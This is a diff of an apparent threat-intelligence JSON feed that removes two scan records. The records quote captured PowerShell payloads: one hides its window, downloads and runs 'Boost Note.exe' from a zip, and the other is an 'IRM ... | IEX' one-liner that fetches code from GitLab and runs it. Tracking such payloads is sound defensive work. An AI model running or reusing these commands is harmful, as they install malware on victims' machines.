@@ -6034,49 +6034,5 @@
     ],
     "ReportId": "cmwlzsh9q1r0l0oml4gpgxjes",
     "ScannedAt": "2026-11-18T10:42:29.669000+00:00"
-  },
-  {
-    "UrlDomain": "genopresse.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.53.133"
-    ],
-    "Related": [
-      {
-        "Value": "https://fbifr.com/ca.js",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwlwqf991qtd0omluedqwsp1",
-    "ScannedAt": "2026-11-18T09:16:54.909000+00:00"
-  },
-  {
-    "UrlDomain": "pedeumgiro.com.br",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "162.241.2.229"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwlwpykb1qs60omlzij10hkx",
-    "ScannedAt": "2026-11-18T09:16:33.273000+00:00"
   }
 ]
